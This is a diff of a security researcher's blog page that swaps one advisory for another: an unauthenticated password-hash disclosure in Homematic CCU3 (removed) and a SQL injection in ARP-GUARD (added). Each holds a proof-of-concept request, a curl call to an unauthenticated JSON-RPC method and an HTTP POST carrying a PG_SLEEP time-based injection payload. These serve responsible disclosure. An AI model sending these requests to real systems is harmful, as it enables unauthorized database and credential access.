@@ -1,9 +1,9 @@
 <html>
 	<head>
-	
+
 	<link href="//gmpg.org/xfn/11" rel="profile">
 	<meta http-equiv="content-type" content="text/html; charset=utf-8">
-	<title>CVE-2019-9727: Unauthenticated password hash disclosure in Homematic CCU3 &middot; Patrick Münch Blog</title>
+	<title>CVE-2019-18663: SQL-Injection in ARP-GUARD &middot; Patrick Münch Blog</title>
 	<meta name="mobile-web-app-capable" content="yes">
 	<meta name="HandheldFriendly" content="True" />
 	<meta name="MobileOptimized" content="320" />
@@ -17,10 +17,10 @@
 	<link rel="shortcut icon" href="http://localhost:4000/assets/images/favicon.ico">
 	<link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">
 	<script type="text/javascript" src="/assets/js/jquery-2.1.0.min.js"></script>
-	
+
 	<script type="text/javascript" src="/assets/js/jquery.stellar.min.js"></script>
-	
-	
+
+
 	<!-- Asynchronous Google Analytics snippet -->
 	<script>
 		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
@@ -31,14 +31,14 @@
 		ga('create', 'UA-114726397-1', 'auto');
 		ga('send', 'pageview');
 	</script>
-	
+
 	<!-- Theme Color for Chrome on Android Lollipop -->
 	<meta name="theme-color" content="#302F2D">
 </head>
 
 	<body>
 		<header class="clean" style="background-image: url(/assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg); height: 100%; " data-stellar-background-ratio="0.5" data-stellar-horizontal-offset="50">
-	
+
 	<label class="menu" for="_1">
 	<span class="genericon genericon-menu"></span>
 </label>
@@ -46,26 +46,26 @@
 <div class="menu-content">
 	<p class="menu-title">Patrick Münch Blog<p>
 	<div class="menu" style="background-color: #1a1a1a; z-index: -1;"></div>
-	
+
 		<a href="/">Home</a>
-	
+
 	<hr>
 	<a href="https://twitter.com/atomiczero111" class="social-links-menu" target="_blank" title="Follow me on twitter"><span class="genericon genericon-twitter"></span></a><a href="https://github.com/atomic111" class="social-links-menu" target="_blank" title="Fork me on github"><span class="genericon genericon-github"></span></a>
 </div>
 <div class="social-links" data-stellar-ratio="0.1">
-	
+
 		<a href="https://twitter.com/atomiczero111" target="_blank" title="Follow me on twitter"><span class="genericon genericon-twitter"></span></a>
-	
+
 		<a href="https://github.com/atomic111" target="_blank" title="Fork me on github"><span class="genericon genericon-github"></span></a>
-	
+
 </div>
 
 	<div id="post-info" data-stellar-ratio="0.7">
-		<h1>CVE-2019-9727: Unauthenticated password hash disclosure in Homematic CCU3</h1>
-		
-		<a class="site-title" href="https://twitter.com/atomiczero111"><div class="site-icon-small" style="background-image: url(https://avatars0.githubusercontent.com/u/7220740?s=400);"></div>Patrick Münch</a>, in 26 March 2019
+		<h1>CVE-2019-18663: SQL-Injection in ARP-GUARD</h1>
+
+		<a class="site-title" href="https://twitter.com/atomiczero111"><div class="site-icon-small" style="background-image: url(https://avatars0.githubusercontent.com/u/7220740?s=400);"></div>Patrick Münch</a>, in 01 November 2019
 	</div>
-	
+
 	<div id="nav-icon" style="bottom: 30px;" data-stellar-ratio="4">
 		<a class="scroll" data-speed="500" href="#article"><span class="genericon genericon-expand"></span></a>
 	</div>
@@ -75,75 +75,66 @@
 		<h1 id="overview">Overview</h1>
 
 <ul>
-  <li>Vendor: eQ-3 AG</li>
-  <li>Product: Homematic CCU3</li>
-  <li>Version: 3.43.15</li>
-  <li>Vulnerability: Unauthenticated password hash disclosure</li>
+  <li>Vendor: ISL Internet Sicherheitslösungen GmbH</li>
+  <li>Product: ARP-GUARD</li>
+  <li>Version: 4.0.0-5</li>
+  <li>Vulnerability: SQL-Injection</li>
+  <li>Fixed Version: 4.0.0-7</li>
 </ul>
 
 <h1 id="background">Background</h1>
 
-<p>HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU3 is a central control unit, which is responsible for integrating these components with each other.</p>
+<p>ARP-GUARD is a Network Access Control Solution to protect company networks against from unauthorised access. It identify allowed devices via their MAC address or certificates (802.1X).</p>
 
 <p>From the vendor’s website:
-“The Central Control Unit CCU3 is the central element for local control of the Homematic IP smart home system. It represents the next generation of our proven Homematic Central Control Units CCU1 and CCU2. Operation via the Central Control Unit CCU3 can be used alternatively to the Homematic IP Access Point. While the Access Point establishes the connection to the free Homematic IP cloud and enables operation of the smart home system via a smartphone app, the Central Control Unit CCU3 works locally via a browser-based web interface (WebUI). Thanks to local configuration and operation as well as the option to create direct device connections, reliable and fail-proof operation of the smart home system is guaranteed at all times – even in the event of Internet failures.”</p>
+“ARP-GUARD makes sure that users don’t use any unauthorised notebooks, smartphones or even wireless access points. Our software solution protects your IT infrastructure from malware-infected external devices and your intellectual property from unauthorised access! Our security solution provides reliable protection against unauthorised access to the internal LAN and WLAN, as well as the Internet. With ARP-GUARD, only authorized devices are granted access to your network!”</p>
 
 <h1 id="issue-description">Issue Description</h1>
 
-<p>While analyzing the implementation of the CCU3, an Unauthenticated Password Hash Disclosure vulnerability has been identified, which can be exploited in order to retrieve the password hashes of all existing user accounts. This vulnerability can be exploited by unauthenticated attackers with access to the web interface. The system provides a JSON-RPC API, which exposes various methods. While some methods require the connecting user to be authenticated, a number of methods can also be used anonymously.</p>
+<p>While analyzing the implementation of the ARP-GUARD web interface, one SQL-Injection vulnerability has been identified, which can be exploited in order to read dump all database data, also the username and passwords for the web application. This vulnerability can be exploited by unauthenticated attackers with access to the web interface.</p>
 
-<p>A code review of the file <code class="highlighter-rouge">/www/api/methods.conf</code> revealed that the <code class="highlighter-rouge">User.getUserPWD</code> method can be used without authentication:</p>
+<p>Please consider the following HTTP request:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User.getUserPWD {
-  LEVEL NONE
-  SCRIPT_FILE user/getuserpwd.tcl
-  INFO {Gibt UserPWD zurück}
-  ARGUMENTS {_session_id_ userID}
-}
+<p><strong>HTTP-Request</strong></p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/login/forgot1</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.1</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">119</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">https://10.10.10.1</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,</span>
+<span class="s">  like Gecko) Falkon/3.0.1 Chrome/69.0.3497.128 Safari/537.36</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,</span>
+<span class="s">image/webp,image/apng,*/*;q=0.8</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">https://10.10.10.1/login/forgot1</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">de-DE,de;q=0.8</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">session_id=whocares; S=whocares</span>
+
+answer=myniceanwser&amp;check=Pr%C3%BCfen&amp;username=username&amp;user_id=
+(SELECT 7529 FROM PG_SLEEP(10))
 </code></pre></div></div>
 
-<p>Exemplary request with a non-authenticated SID:</p>
-
-<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">curl -X POST -k -i 'https://1.1.1.1/api/homematic.cgi' --data '{
-  "version": "1.1",
-  "method": "User.getUserPWD",
-  "params": {
-    "_session_id_": "@MagZdAHu8d@",
-    "userID": "Admin"
-  }
-}'
-</span></code></pre></div></div>
-
-<p>Response of the Homematic CCU3:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
-  "version": "1.1",
-  "result": {
-      "UserPWD": "c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec"
-  }.UserPWD,
-  "error": null
-}
-</code></pre></div></div>
+<p>It was possible to extract the admin password for the web application via the time-based SQL-Injection.</p>
 
 <h1 id="cve">CVE</h1>
 
-<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9727">CVE-2019-9727</a></p>
+<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18663">CVE-2019-18663</a></p>
 
 <h1 id="cvssv3-base-score">CVSSv3 Base Score</h1>
 
-<p>CVSS Base Score: <strong>5.9</strong></p>
+<p>CVSS Base Score: <strong>8.1</strong></p>
 
-<p>CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N</p>
+<p>CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H</p>
 
 <h1 id="credit">Credit</h1>
 
-<p>Patrick Muench of <a href="https://www.sva.de">SVA System Vertrieb Alexander GmbH</a></p>
-
-<p>Torsten Löbner of <a href="https://www.sva.de">SVA System Vertrieb Alexander GmbH</a></p>
-
-<p>Pascal Keul of <a href="https://www.sva.de">SVA System Vertrieb Alexander GmbH</a></p>
-
-<p>Lukas Zorn of <a href="https://www.sva.de">SVA System Vertrieb Alexander GmbH</a></p>
+<p>Pascal Keul of <a href="https://www.sva.de">SVA System Vertrieb Alexander GmbH</a>
+Patrick Muench of <a href="https://www.sva.de">SVA System Vertrieb Alexander GmbH</a>
+Torsten Löbner of <a href="https://www.sva.de">SVA System Vertrieb Alexander GmbH</a></p>
 
 <h1 id="disclaimer">Disclaimer</h1>
 
@@ -152,12 +143,12 @@
 <p>The contents of this advisory are copyright (c) 2019 SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.</p>
 
 	</div>
-	
+
 	<div id="comments">
-		
-	
+
+
 	<script src="https://apis.google.com/js/plusone.js"></script>
-	<div id="g-comments" class="g-comments" data-href="http://localhost:4000/article/homematic-ccu3-unauthenticated-password-hash-disclosure" data-width="700" data-first_party_property="BLOGGER" data-view_type="FILTERED_POSTMOD"></div>
+	<div id="g-comments" class="g-comments" data-href="http://localhost:4000/article/arp-guard-sql-injection" data-width="700" data-first_party_property="BLOGGER" data-view_type="FILTERED_POSTMOD"></div>
 	<script>
 		var width = $('#comments').width() * 0.9;
 		width = Math.round(width);
@@ -166,7 +157,7 @@
 
 
 	</div>
-	
+
 	<div class="social center">
 		<div class="network">
 		<a class="hn-link" href="javascript:window.location=%22http://news.ycombinator.com/submitlink?u=%22+encodeURIComponent(document.location)+%22&amp;t=%22+encodeURIComponent(document.title)">Discuss on Hacker News</a>
@@ -185,11 +176,11 @@
 	</div>
 	<div id="post-info" data-stellar-ratio="0.5" data-stellar-vertical-offset="120">
 		<h3>Read next</h3>
-		<a href="/article/arp-guard-sql-injection">
-			<h1>CVE-2019-18663: SQL-Injection in ARP-GUARD</h1>
-			
+		<a href="/article/secudos-domos-directory_traversal">
+			<h1>CVE-2019-18665: Directory Traversal in DOMOS</h1>
+
 				<h2></h2>
-			
+
 		</a>
 	</div>
 	<p class="copyright">&copy;2019, <a href="http://atomic111.github.io" target="_blank">Patrick Münch</a>. <a href="" target="_blank">All rights reserved</a>.</p>
